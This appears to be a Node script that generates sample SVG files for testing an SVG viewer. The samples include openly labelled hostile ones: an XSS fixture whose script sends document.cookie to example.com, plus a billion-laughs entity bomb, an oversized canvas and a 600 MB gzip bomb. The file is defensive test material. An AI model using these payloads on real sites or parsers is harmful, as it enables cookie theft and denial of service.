// Writes the made-up sample files (the real ones come from W3C, Wikimedia Commons and Google, see samples/README.md).
// usage: node scripts/make-samples.mjs <dir>
import fs from 'node:fs';
import path from 'node:path';
import zlib from 'node:zlib';

const dir = path.resolve(process.argv[2] || 'samples');
fs.mkdirSync(dir, { recursive: true });
const put = (name, text) => { fs.writeFileSync(path.join(dir, name), text); console.log(name, Buffer.byteLength(text)); };
const NS = 'xmlns="http://www.w3.org/2000/svg"';

// Light and dark styles through prefers-color-scheme (a favicon or README badge pattern).
put('color-scheme.svg', `<svg ${NS} width="240" height="120" viewBox="0 0 240 120">
  <style>
    .bg { fill: #ffffff; } .fg { fill: #1b1f2e; } .ring { stroke: #e8a33d; }
    @media (prefers-color-scheme: dark) { .bg { fill: #1b1f2e; } .fg { fill: #ffffff; } .ring { stroke: #8fa3ff; } }
  </style>
  <rect class="bg" width="240" height="120" rx="16"/>
  <circle class="ring" cx="60" cy="60" r="34" fill="none" stroke-width="10"/>
  <rect class="fg" x="112" y="38" width="100" height="14" rx="7"/>
  <rect class="fg" x="112" y="68" width="70" height="14" rx="7"/>
</svg>
`);

// No viewBox: user units are pixels.
put('no-viewbox.svg', `<svg ${NS} width="320" height="200">
  <rect x="10" y="10" width="300" height="180" fill="#e8f0fe" stroke="#3367d6" stroke-width="4"/>
  <path d="M30 170 L110 60 L170 130 L210 90 L290 170 Z" fill="#3367d6"/>
  <circle cx="250" cy="55" r="22" fill="#fbbc04"/>
</svg>
`);

// viewBox with a negative origin, and shapes that stick out of it (they show in the dim area with viewBox on).
put('viewbox-offset.svg', `<svg ${NS} width="400" height="300" viewBox="-200 -150 400 300">
  <rect x="-200" y="-150" width="400" height="300" fill="#fff7e6"/>
  <line x1="-200" y1="0" x2="200" y2="0" stroke="#999" stroke-dasharray="6 4"/>
  <line x1="0" y1="-150" x2="0" y2="150" stroke="#999" stroke-dasharray="6 4"/>
  <circle cx="0" cy="0" r="60" fill="#e8a33d"/>
  <rect x="150" y="-40" width="120" height="80" fill="#3367d6" opacity="0.8"/>
  <circle cx="-190" cy="-140" r="40" fill="#d93025" opacity="0.8"/>
</svg>
`);

// The smallest possible picture.
put('one-pixel.svg', `<svg ${NS} width="1" height="1"><rect width="1" height="1" fill="#d93025"/></svg>\n`);

// A gzip-packed SVG.
const badge = `<svg ${NS} width="160" height="40" viewBox="0 0 160 40"><rect width="160" height="40" rx="6" fill="#1b1f2e"/><rect x="80" width="80" height="40" rx="6" fill="#2e7d32"/><rect x="80" width="10" height="40" fill="#2e7d32"/><circle cx="40" cy="20" r="10" fill="#ffb547"/><path d="M100 20 l8 8 l16 -16" fill="none" stroke="#fff" stroke-width="5"/></svg>\n`;
fs.writeFileSync(path.join(dir, 'badge.svgz'), zlib.gzipSync(Buffer.from(badge), { level: 9 }));
console.log('badge.svgz', fs.statSync(path.join(dir, 'badge.svgz')).size);

// Hostile 1: script, event handlers, foreignObject with HTML, and remote resources. None may run or load.
put('hostile-script.svg', `<svg ${NS} xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200" viewBox="0 0 300 200" onload="alert('onload')">
  <script>alert('script'); fetch('http://example.com/steal?c=' + document.cookie);</script>
  <script xlink:href="http://example.com/evil.js"/>
  <rect width="300" height="200" fill="#ffe0e0" onclick="alert('click')" onmouseover="alert('hover')"/>
  <image href="http://example.com/x.png" x="10" y="10" width="80" height="80"/>
  <image xlink:href="https://example.com/y.png" x="100" y="10" width="80" height="80"/>
  <rect x="190" y="10" width="100" height="80" style="fill: url(http://example.com/pattern.svg#p)"/>
  <foreignObject x="10" y="100" width="280" height="90">
    <div xmlns="http://www.w3.org/1999/xhtml"><iframe src="http://example.com/"></iframe><img src="http://example.com/z.png" onerror="alert('img')"/>HTML inside</div>
  </foreignObject>
  <text x="150" y="190" text-anchor="middle" font-size="14" fill="#900">hostile-script.svg</text>
</svg>
`);

// Hostile 2: "billion laughs" entity expansion in a DOCTYPE.
let ents = '<!ENTITY lol "lol">\n';
for (let i = 1; i <= 9; i++) ents += `<!ENTITY lol${i} "${(i === 1 ? '&lol;' : `&lol${i - 1};`).repeat(10)}">\n`;
put('hostile-entities.svg', `<?xml version="1.0"?>\n<!DOCTYPE svg [\n${ents}]>\n<svg ${NS} width="200" height="100"><text x="10" y="50">&lol9;</text></svg>\n`);

// Hostile 3: a picture that claims to be 100,000,000 px wide and high.
put('hostile-huge-size.svg', `<svg ${NS} width="100000000" height="100000000" viewBox="0 0 100 100"><rect width="100" height="100" fill="#3367d6"/><circle cx="50" cy="50" r="40" fill="#fbbc04"/></svg>\n`);

// Hostile 4: an .svgz that unpacks to 600 MB (a zip bomb), more than SVG Viewer will read.
{
  const gz = zlib.createGzip({ level: 9 });
  const out = fs.createWriteStream(path.join(dir, 'hostile-bomb.svgz'));
  gz.pipe(out);
  gz.write(`<svg ${NS} width="10" height="10"><desc>`);
  const chunk = Buffer.alloc(1024 * 1024, 0x20);
  let n = 0;
  const pump = () => { while (n < 600) { n++; if (!gz.write(chunk)) { gz.once('drain', pump); return; } } gz.end('</desc></svg>'); };
  pump();
  out.on('finish', () => console.log('hostile-bomb.svgz', fs.statSync(path.join(dir, 'hostile-bomb.svgz')).size));
}
